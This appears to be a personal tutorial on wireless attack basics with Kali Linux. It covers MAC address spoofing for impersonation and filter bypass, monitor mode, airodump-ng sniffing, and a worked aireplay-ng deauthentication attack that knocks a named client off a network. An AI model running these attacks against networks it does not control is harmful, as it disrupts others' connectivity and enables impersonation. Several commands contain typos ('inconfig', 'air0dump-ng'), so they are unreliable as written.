# MAC Address:
- Media Access Control
	- Permanent
	- Physical
	- Unique
- Assigned by manufacturer.

## Why change the mac address?
- Increase anonymity.
- Impersonate other devives.
- Bypass filters.

If you execute below command in kali machine, then some results you will get.
```bash
inconfig
```
For every interfaces (like eth0, lo or wlan0), there is an option named **ether** which tells the mac address. If the network is connected, then also can see **inet** flag to that interface which is connected to the internet.

To change the mac address, simply execute the below command first to disable the interfaces. *wlan0* is that interface name which you want to change the mac address.

```bash
ifconfig wlan0 down
```
Now to change the mac address, execute

```bash
ifconfig wlan0 hw ether 00:11:22:33:44:55
```

You can change the mac address to any address, but make sure that the first 2 digits should always start with 0. After that, have to enable the interfaces

```bash
ifconfig wlan0 up
```
The mac address will revert back to the original one once restarts your computer because this mac address is changed in the memory, not in physical.

# Wireless Modes (Managed & Monitor)
To see the wireless interfaces, the command is used.

```bash
iwconfig
```
From the result, one of the interface Mode is **Managed**. It means that this is the default mode of all wireless devices and it also means that it only captures packets that has destination mac as the mac address of this device. We want that we want to able to capture all the packets that are within our range even if they are set to the router and even if they are set to another device. To do this, have to set the mode to the **monitor** mode. For that, first have to stop the interfaces.

```
ifconfig wlan0 down
```
Then for better result, execute
```
airmon-ng check kill
```
If you notice that, when the above command is executed, your wifi is turned off. Now change to the monitor mode. [Note: To restart the network, use following one of the commands, 1. "service network-manager restart" 2. "service NetworkManager restart" 3. "service avahi-daemon restart"]
```bash
iwconfig wlan0 mode monitor
```
And then turn on the interfaces by
```bash
ifconfig wlan0 up
```
Now if you execute **iwconfig**, you can notice that, the mode is changed to Monitor mode.

# Packet Sniffing Using AIRODUMP-NG
- Part of the aircrack-ng suit
- Airodump-ng is a packet sniffer
- Used to capture all packets within range
- Display detailed info about networks around us
- Connected clients ...etc

```bash
airodump-ng [MonitorModeInterface]
```
For that, first have to enable the monitor mode. Then execute below command, where have to pass that interface which you are converted to the monitor mode.
```bash
airodump-ng wlan0
```
After the executing, this will display all wireless networks and their information around me. This process will continue unless you quite qith ctrl + c.

# WIFI Bands:
- Decides the frequency range that can be used.
- Determines the channels that can be used.
- Clients need to support band used by router to communicate with it.
- Data can be sniffed from a certain band if the wireless adapter used supports that band.
- Most monnon Wifi bands are:
	- 'a' uses 5 Ghz frequency only.
	- 'b', 'g' both use 2.4 Ghz frequency only.
	- 'n' uses 5 and 2.4 Ghz
	- 'ac' uses frequencies lower than 6 Ghz

```bash
airodump-ng --band a wlan0
```
Also can pass multiple bands at a time.
```bash
airodump-ng --band abg wlan0
```

# Target Packet Sniffing
```bash
air0dump-ng --bssid F0:B4:D2:62:54:BF --channel 6 --write test wlan0
```
If you go to the directory where the test files are saved, you can see several files which names are started with test like "test-01.csv", "test-01.kismet.netxml", "test-01.cap", "test-01.kismet.csv". The record are captured in "test-01.cap" file. But if the encription technology "WPA2" is used to your router, then the data will be in encripted. If you execute in terminal
```bash
wireshark
```
this will open the application and if you open and select one packet from the .cap file, you will not get useful data.

# Deauthentication Attack:
- Disconnect any client from any network
	- Works on encrypted networks (WEP, WPA & WPA2)
	- No need to know the network key
	- No need to connect to the network

Use
```bash
aireplay-ng --deauth [#DeauthPackets] -a [NetworkMac] -c [TargetMac] [Interface]
```
An example could be
```bash
aireplay-ng --deauth 100000000 -a F0:B4:D2:62:54:BF -c 80:91:33:4E:7A:19 -D wlan0
```
-D is if the network uses the 5ghz frequency. Otherwise don't pass that. F0:B4:D2:62:54:BF is the router bssid address and 0:91:33:4E:7A:19 is the target machine mac address. Before executing the above command, first execute
```bash
airodump-ng --bssid F0:B4:D2:62:54:BF --channel 6 --write test wlan0
```
If you notice that, the network of the client is gone and you can't connect to that machile unless I quite the process in my kali linux terminal.